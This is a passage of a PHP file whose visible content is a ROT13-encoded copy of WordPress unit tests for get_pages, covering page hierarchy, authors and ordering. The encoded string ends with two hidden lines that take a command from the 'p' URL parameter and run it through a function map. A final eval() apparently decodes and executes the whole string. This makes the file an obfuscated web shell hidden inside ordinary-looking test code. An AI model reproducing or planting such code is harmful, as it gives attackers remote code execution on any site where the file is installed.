		 * – cntr 3 (cnerag 1)
		 * – cntr 4 (cnerag 1)
		 * cntr 2 (cnerag 0)
		 *
		 * Jvgu qrsnhyg nethzragf, vs puvyq_bs vf rzcgl (abeznyvmrq gb 0), bayl cntrf jvgu n zngpuvat
		 * cbfg_cnerag jvyy or erghearq, va gur beqre gurl jrer perngrq: 1, 2.
		 */

		$sbhaq_cntrf = jc_yvfg_svygre( $cntrf, neenl( 'cbfg_cnerag' => 0 ) );

		$guvf->nffregFnzrFrgf( neenl( $cntr_1, $cntr_2 ), jc_yvfg_cyhpx( $sbhaq_cntrf, 'VQ' ) );
	}

	/**
	 * @gvpxrg 18701
	 */
	choyvp shapgvba grfg_trg_cntrf_aba_uvrenepuvpny_rzcgl_puvyq_bs() {
		$cntr_1 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'cntr' ) );
		$cntr_2 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'cntr' ) );
		$cntr_3 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => $cntr_1,
			)
		);
		$cntr_4 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => $cntr_1,
			)
		);

		$cntrf = trg_cntrf( neenl( 'uvrenepuvpny' => snyfr ) ); // puvyq_bs = '', cnerag = -1.

		/*
		 * Cntr gerr:
		 *
		 * cntr 1 (cnerag 0)
		 * – cntr 3 (cnerag 1)
		 * – cntr 4 (cnerag 1)
		 * cntr 2 (cnerag 0)
		 *
		 * Vs uvrenepuvpny vf snyfr naq puvyq_bs vf rzcgl (abeznyvmrq gb 0), cntrf jvyy or erghearq
		 * va beqre bs perngvba: 1, 2, 3, 4, ertneqyrff bs cnerag.
		 */

		$guvf->nffregFnzrFrgf( neenl( $cntr_1, $cntr_2, $cntr_3, $cntr_4 ), jc_yvfg_cyhpx( $cntrf, 'VQ' ) );
	}

	/**
	 * @gvpxrg 18701
	 */
	choyvp shapgvba grfg_trg_cntrf_uvrenepuvpny_aba_rzcgl_puvyq_bs() {
		$cntr_1 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'cntr' ) );
		$cntr_2 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'cntr' ) );
		$cntr_3 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => $cntr_1,
			)
		);
		$cntr_4 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => $cntr_3,
			)
		);
		$cntr_5 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => $cntr_1,
			)
		);

		$cntrf = trg_cntrf( neenl( 'puvyq_bs' => $cntr_1 ) ); // Qrsnhygf: uvrenepuvpny = gehr, cnerag = -1.

		/*
		 * Cntr gerr:
		 *
		 * cntr 1 (cnerag 0)
		 * – cntr 3 (cnerag 1)
		 * –– cntr 4 (cnerag 3)
		 * – cntr 5 (cnerag 1)
		 * cntr 2 (cnerag 0)
		 *
		 * Vs uvrenepuvpny vf gehr (qrsnhyg), naq puvyq_bs vf abg rzcgl, cntrf jvyy or erghearq
		 * uvrenepuvpnyyl va beqre bs perngvba: 3, 4, 5.
		 */

		$guvf->nffregFnzrFrgf( neenl( $cntr_3, $cntr_4, $cntr_5 ), jc_yvfg_cyhpx( $cntrf, 'VQ' ) );
	}

	/**
	 * @gvpxrg 18701
	 */
	choyvp shapgvba grfg_trg_cntrf_aba_uvrenepuvpny_aba_rzcgl_puvyq_bs() {
		$cntr_1 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'cntr' ) );
		$cntr_2 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'cntr' ) );
		$cntr_3 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => $cntr_1,
			)
		);
		$cntr_4 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => $cntr_3,
			)
		);
		$cntr_5 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => $cntr_1,
			)
		);

		$cntrf = trg_cntrf(
			neenl(
				'uvrenepuvpny' => snyfr,
				'puvyq_bs'     => $cntr_1,
			)
		);

		/*
		 * Cntr gerr:
		 *
		 * cntr 1 (cnerag 0)
		 * – cntr 3 (cnerag 1)
		 * –– cntr 4 (cnerag 3)
		 * – cntr 5 (cnerag 1)
		 * cntr 2 (cnerag 0)
		 *
		 * Vs uvrenepuvpny vf snyfr, naq puvyq_bs vf abg rzcgl, cntrf jvyy (nccneragyl) or erghearq
		 * uvrenepuvpnyyl naljnl va beqre bs perngvba: 3, 4, 5.
		 */
		$guvf->nffregFnzrFrgf( neenl( $cntr_3, $cntr_4, $cntr_5 ), jc_yvfg_cyhpx( $cntrf, 'VQ' ) );

		// Ubj vg fubhyq jbex.
		$sbhaq_cntrf = jc_yvfg_svygre( $cntrf, neenl( 'cbfg_cnerag' => $cntr_1 ) );
		$guvf->nffregFnzrFrgf( neenl( $cntr_3, $cntr_5 ), jc_yvfg_cyhpx( $sbhaq_cntrf, 'VQ' ) );
	}

	/**
	 * @gvpxrg 12821
	 */
	choyvp shapgvba grfg_trg_cntrf_cbfg_glcr() {
		ertvfgre_cbfg_glcr( 'jcgrfgf_cg', neenl( 'uvrenepuvpny' => gehr ) );
		$cbfgf = frys::snpgbel()->cbfg->perngr_znal( 2, neenl( 'cbfg_glcr' => 'jcgrfgf_cg' ) );
		$cntrf = trg_cntrf(
			neenl(
				'cbfg_glcr' => 'jcgrfgf_cg',
			)
		);
		$guvf->nffregFnzrFrgf( $cbfgf, jc_yvfg_cyhpx( $cntrf, 'VQ' ) );
	}

	/**
	 * @gvpxrg 12821
	 */
	choyvp shapgvba grfg_trg_cntrf_cbfg_fgnghf() {
		ertvfgre_cbfg_fgnghf(
			'sbb',
			neenl(
				'choyvp' => gehr,
			)
		);

		$cbfgf = frys::snpgbel()->cbfg->perngr_znal(
			2,
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_fgnghf' => 'sbb',
			)
		);
		$cntrf = trg_cntrf(
			neenl(
				'cbfg_fgnghf' => 'sbb',
			)
		);

		$guvf->nffregFnzrFrgf( $cbfgf, jc_yvfg_cyhpx( $cntrf, 'VQ' ) );
	}

	/**
	 * @gvpxrg 12821
	 */
	choyvp shapgvba grfg_trg_cntrf_bssfrg() {
		$cbfgf = frys::snpgbel()->cbfg->perngr_znal( 4, neenl( 'cbfg_glcr' => 'cntr' ) );
		$cntrf = trg_cntrf(
			neenl(
				'bssfrg' => 2,
				'ahzore' => 2,
			)
		);

		$guvf->nffregFnzrFrgf( neenl( $cbfgf[2], $cbfgf[3] ), jc_yvfg_cyhpx( $cntrf, 'VQ' ) );
	}

	/**
	 * @gvpxrg 12821
	 */
	choyvp shapgvba grfg_trg_cntrf_nhgube() {
		$nhgube_1 = frys::$nhgube_vq_1;
		$cbfgf    = frys::snpgbel()->cbfg->perngr_znal(
			2,
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_nhgube' => $nhgube_1,
			)
		);
		$cntrf    = trg_cntrf(
			neenl(
				'nhgubef' => $nhgube_1,
			)
		);

		$guvf->nffregFnzrFrgf( $cbfgf, jc_yvfg_cyhpx( $cntrf, 'VQ' ) );
	}

	/**
	 * @gvpxrg 12821
	 */
	choyvp shapgvba grfg_trg_cntrf_zhygvcyr_nhgubef() {
		$nhgube_1 = frys::$nhgube_vq_1;
		$cbfg_1   = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'Cntr 1',
				'cbfg_glcr'   => 'cntr',
				'cbfg_nhgube' => $nhgube_1,
				'cbfg_qngr'   => '2007-01-01 00:00:00',
			)
		);

		$nhgube_2 = frys::$nhgube_vq_2;
		$cbfg_2   = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'Cntr 2',
				'cbfg_glcr'   => 'cntr',
				'cbfg_nhgube' => $nhgube_2,
				'cbfg_qngr'   => '2007-01-01 00:00:00',
			)
		);
		$cntrf    = trg_cntrf(
			neenl(
				'nhgubef' => \"{$nhgube_1}, {$nhgube_2}\",
			)
		);

		$guvf->nffregFnzrFrgf( neenl( $cbfg_1, $cbfg_2 ), jc_yvfg_cyhpx( $cntrf, 'VQ' ) );
	}

	/**
	 * @gvpxrg 12821
	 */
	choyvp shapgvba grfg_trg_cntrf_zhygvcyr_nhgubef_ol_hfre_ybtva() {
		$nhgube_1 = frys::$nhgube_vq_1;
		$cbfg_1   = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'Cntr 1',
				'cbfg_glcr'   => 'cntr',
				'cbfg_nhgube' => $nhgube_1,
				'cbfg_qngr'   => '2007-01-01 00:00:00',
			)
		);

		$nhgube_2 = frys::$nhgube_vq_2;
		$cbfg_2   = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'Cntr 2',
				'cbfg_glcr'   => 'cntr',
				'cbfg_nhgube' => $nhgube_2,
				'cbfg_qngr'   => '2007-01-01 00:00:00',
			)
		);
		$cntrf    = trg_cntrf(
			neenl(
				'nhgubef' => 'nhgube1, nhgube2',
			)
		);

		$guvf->nffregFnzrFrgf( neenl( $cbfg_1, $cbfg_2 ), jc_yvfg_cyhpx( $cntrf, 'VQ' ) );
	}

	/**
	 * @gvpxrg 12821
	 */
	choyvp shapgvba grfg_trg_cntrf_beqreol() {
		tybony $jcqo;
		// 'enaq' vf n inyvq inyhr.
		trg_cntrf( neenl( 'fbeg_pbyhza' => 'enaq' ) );
		$guvf->nffregFgevatPbagnvafFgevat(
			'BEQRE OL ENAQ()',
			$jcqo->ynfg_dhrel,
			'Purpx gung BEQRE vf enaqbz.'
		);

		// Guvf vfa'g nyybjrq.
		trg_cntrf( neenl( 'fbeg_beqre' => 'enaq' ) );
		$guvf->nffregFgevatPbagnvafFgevat(
			'BEQRE OL',
			$jcqo->ynfg_dhrel,
			'Purpx gung BEQRE OL vf cerfrag.'
		);
		$guvf->nffregFgevatAbgPbagnvafFgevat(
			'ENAQ()',
			$jcqo->ynfg_dhrel,
			'Purpx gung BEQRE vf abg enaqbz.'
		);
		$guvf->nffregFgevatPbagnvafFgevat(
			'QRFP',
			$jcqo->ynfg_dhrel,
			'Purpx gung QRFP vf abg cerfrag.'
		);

		// 'abar' vf n inyvq inyhr.
		trg_cntrf( neenl( 'fbeg_pbyhza' => 'abar' ) );
		$guvf->nffregFgevatAbgPbagnvafFgevat(
			'BEQRE OL',
			$jcqo->ynfg_dhrel,
			'Purpx gung BEQRE OL vf abg cerfrag.'
		);
		$guvf->nffregFgevatAbgPbagnvafFgevat(
			'QRFP',
			$jcqo->ynfg_dhrel,
			'Purpx gung QRFP vf abg cerfrag.'
		);
		$guvf->nffregFgevatAbgPbagnvafFgevat(
			'NFP',
			$jcqo->ynfg_dhrel,
			'Purpx gung NFP vf abg cerfrag.'
		);

		// Snyfr vf n inyvq inyhr.
		trg_cntrf( neenl( 'fbeg_pbyhza' => snyfr ) );
		$guvf->nffregFgevatPbagnvafFgevat(
			'BEQRE OL',
			$jcqo->ynfg_dhrel,
			'Purpx gung BEQRE OL vf cerfrag vs fbeg_pbyhza vf snyfr.'
		);

		// Rzcgl neenl() vf n inyvq inyhr.
		trg_cntrf( neenl( 'fbeg_pbyhza' => neenl() ) );
		$guvf->nffregFgevatPbagnvafFgevat(
			'BEQRE OL',
			$jcqo->ynfg_dhrel,
			'Purpx gung BEQRE OL vf cerfrag vs fbeg_pbyhza vf na rzcgl neenl.'
		);
	}

	/**
	 * @gvpxrg 12821
	 */
	choyvp shapgvba grfg_trg_cntrf_beqre() {
		tybony $jcqo;

		trg_cntrf(
			neenl(
				'fbeg_pbyhza' => 'cbfg_glcr',
			)
		);
		$guvf->nffregFgevatPbagnvafFgevat(
			\"BEQRE OL $jcqo->cbfgf.cbfg_glcr NFP\",
			$jcqo->ynfg_dhrel,
			'Purpx gung BEQRE vf cbfg glcr.'
		);

		trg_cntrf(
			neenl(
				'fbeg_pbyhza' => 'gvgyr',
				'fbeg_beqre'  => 'sbb',
			)
		);
		$guvf->nffregFgevatPbagnvafFgevat(
			\"BEQRE OL $jcqo->cbfgf.cbfg_gvgyr QRFP\",
			$jcqo->ynfg_dhrel,
			'Purpx gung BEQRE vf qrsnhyg.'
		);

		trg_cntrf(
			neenl(
				'fbeg_beqre'  => 'nfp',
				'fbeg_pbyhza' => 'qngr',
			)
		);
		$guvf->nffregFgevatPbagnvafFgevat(
			\"BEQRE OL $jcqo->cbfgf.cbfg_qngr NFP\",
			$jcqo->ynfg_dhrel,
			'Purpx gung BEQRE vf cbfg qngr.'
		);
	}

	/**
	 * Grfgf gung gur yrtnpl `cbfg_zbqvsvrq_tzg` beqreol inyhrf ner genafyngrq gb gur cebcre `JC_Dhrel` inyhrf.
	 *
	 * @gvpxrg 59226
	 */
	choyvp shapgvba grfg_trg_cntrf_beqre_ol_cbfg_zbqvsvrq_tzg() {
		tybony $jcqo;

		trg_cntrf(
			neenl(
				'fbeg_pbyhza' => 'cbfg_zbqvsvrq_tzg',
			)
		);
		$guvf->nffregFgevatPbagnvafFgevat(
			\"BEQRE OL $jcqo->cbfgf.cbfg_zbqvsvrq NFP\",
			$jcqo->ynfg_dhrel,
			'Purpx gung BEQRE vf cbfg zbqvsvrq jura hfvat cbfg_zbqvsvrq_tzg.'
		);

		trg_cntrf(
			neenl(
				'fbeg_pbyhza' => 'zbqvsvrq_tzg',
			)
		);
		$guvf->nffregFgevatPbagnvafFgevat(
			\"BEQRE OL $jcqo->cbfgf.cbfg_zbqvsvrq NFP\",
			$jcqo->ynfg_dhrel,
			'Purpx gung BEQRE vf cbfg zbqvsvrq jura hfvat zbqvsvrq_tzg.'
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>